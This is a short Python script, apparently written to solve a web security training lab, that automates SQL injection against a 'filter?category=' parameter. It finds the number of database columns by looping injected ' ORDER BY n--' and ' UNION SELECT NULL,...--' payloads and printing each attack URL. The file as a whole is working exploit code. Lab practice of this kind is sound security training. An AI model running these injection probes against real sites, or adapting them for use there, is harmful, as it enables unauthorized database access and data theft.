from lib import SESSION, generate_parser

if __name__ == "__main__":
    args = generate_parser()

    lab_url = args.lab_url.strip("/")

    # NOTE: The UNION SELECT method is enough for solving this lab... I tried both methods for practice

    print("[+] Determining the number of columns using ORDER BY...")

    columns = 0

    while True:
        columns += 1

        query = f"' ORDER BY {columns}--"

        print(f"[+] Making Query {columns}: {lab_url}/filter?category={query}")

        if SESSION.get(f"{lab_url}/filter?category={query}").status_code == 200:
            continue
        else:
            break

    print(f"[+] The number of columns found using ORDER BY is {columns - 1}")

    print("[+] Determining the number of columns using UNION SELECT...")

    columns = 1

    while True:
        payload = ", ".join(["NULL"] * columns)
        query = f"' UNION SELECT {payload}--"

        print(f"[+] Making Query {columns}: {lab_url}/filter?category={query}")

        if SESSION.get(f"{lab_url}/filter?category={query}").status_code == 200:
            break
        else:
            columns += 1

    print(f"[+] The number of columns is {columns}")
    print(f"[+] The number of columns found using UNION SELECT is {columns}")

    print("[+] The lab is solved. Check the lab page")
